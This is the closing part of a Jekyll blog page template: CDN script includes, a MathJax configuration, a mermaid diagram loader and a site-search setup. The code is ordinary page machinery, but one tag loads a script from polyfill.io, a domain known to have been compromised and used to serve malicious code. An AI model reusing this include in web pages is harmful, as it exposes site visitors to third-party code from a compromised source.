    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.21.3/dist/tocbot.min.js,npm/mermaid@10.6.0/dist/mermaid.min.js"></script>






<script defer src="/assets/js/dist/post.min.js"></script>


  <!-- MathJax -->
  <script>
    /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */
    MathJax = {
      tex: {
        /* start/end delimiter pairs for in-line math */
        inlineMath: [
          ['$', '$'],
          ['\\(', '\\)']
        ],
        /* start/end delimiter pairs for display math */
        displayMath: [
          ['$$', '$$'],
          ['\\[', '\\]']
        ]
      }
    };
  </script>
  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-chtml.js"></script>





    
      <!-- mermaid-js loader -->
<script type="text/javascript">
  (function () {
    function updateMermaid(event) {
      if (event.source === window && event.data && event.data.direction === ModeToggle.ID) {
        const mode = event.data.message;

        if (typeof mermaid === 'undefined') {
          return;
        }

        let expectedTheme = mode === ModeToggle.DARK_MODE ? 'dark' : 'default';
        let config = { theme: expectedTheme };

        /* Re-render the SVG  <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */
        $('.mermaid').each(function () {
          let svgCode = $(this).prev().children().html();
          $(this).removeAttr('data-processed');
          $(this).html(svgCode);
        });

        mermaid.initialize(config);
        mermaid.init(undefined, '.mermaid');
      }
    }

    let initTheme = 'default';
    const html = document.documentElement;

    if (
      (html.hasAttribute('data-mode') && html.getAttribute('data-mode') === 'dark') ||
      (!html.hasAttribute('data-mode') && window.matchMedia('(prefers-color-scheme: dark)').matches)
    ) {
      initTheme = 'dark';
    }

    let mermaidConf = {
      theme: initTheme /* <default|dark|forest|neutral> */
    };

    /* Create mermaid tag */
    document.querySelectorAll('pre>code.language-mermaid').forEach((elem) => {
      const svgCode = elem.textContent;
      const backup = elem.parentElement;
      backup.classList.add('unloaded');
      /* create mermaid node */
      let mermaid = document.createElement('pre');
      mermaid.classList.add('mermaid');
      const text = document.createTextNode(svgCode);
      mermaid.appendChild(text);
      backup.after(mermaid);
    });

    mermaid.initialize(mermaidConf);

    window.addEventListener('message', updateMermaid);
  })();
</script>

    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

